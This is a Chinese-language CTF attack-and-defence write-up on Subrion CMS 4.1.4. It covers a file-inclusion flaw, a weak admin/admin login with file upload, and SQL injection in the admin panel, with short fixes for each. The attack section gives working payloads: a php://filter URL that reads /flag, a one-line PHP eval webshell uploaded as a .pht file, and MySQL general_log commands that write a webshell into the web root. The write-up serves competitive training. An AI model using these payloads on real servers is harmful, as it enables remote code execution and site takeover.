# bugku-awd小记10.7

## Web

**Subrion CMS 4.1.4**

先把源码copy下来，拿D盾扫一遍

![image-20251007191012280](https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251007200834342.png)

#### 1.文件包含漏洞

fix：直接删除

![image-20251007191047854](https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251007200834344.png)

#### 2.弱口令+文件上传

![image-20251007191151830](https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251007200834345.png)

管理员后台的账户密码是admin/admin，同时可以从config.inc.php 中得到数据库密码![image-20251007191404310](https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251007200834346.png)

fix：改admin弱密码

![image-20251007191520845](https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251007200834347.png)

然后登录后台看到可以upload，所以攻击时考虑传马

#### 3.sql注入

在panel里

![image-20251007192515325](https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251007200834348.png)

Database处可以进行SQL注入，不过flag是错的

![image-20251007192544890](https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251007200834349.png)

这里去群里吹水去了，没来得及修



### attack：

#### 1.文件包含

访问，直接能读到flag

```
http://192-168-1-67.pvp6715.bugku.cn/game/index.php/?file=php://filter/convert.base64-encode/resource=/flag
```

#### 2.传马

**上传点：/panel/uploads**

传a.pht

```
GIF89a
<?php  @eval($_REQUEST['huaji']);?>
```

之后访问即可。

![image-20251007192348932](https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251007200834350.png)

#### 3.sql注入

panel里的database，先开启general_log

```
set global general_log=on;
```

然后让他写马进去，设置的日志文件路径

```
set global general_log_file="/var/www/html/set_config.php";
select '<?phpeval($_REQUEST[yunsee])?>';
```

这样也可以写马进去

![image-20251007193033553](https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251007200834351.png)

## PWN

队友出的，ret2text，签到题

直接读取即可。

![image-20251007193319745](https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251007200834352.png)

fix的内容没发出来，就不写（抄）了

<p style="text-align: right;">
by. Huaji
</p>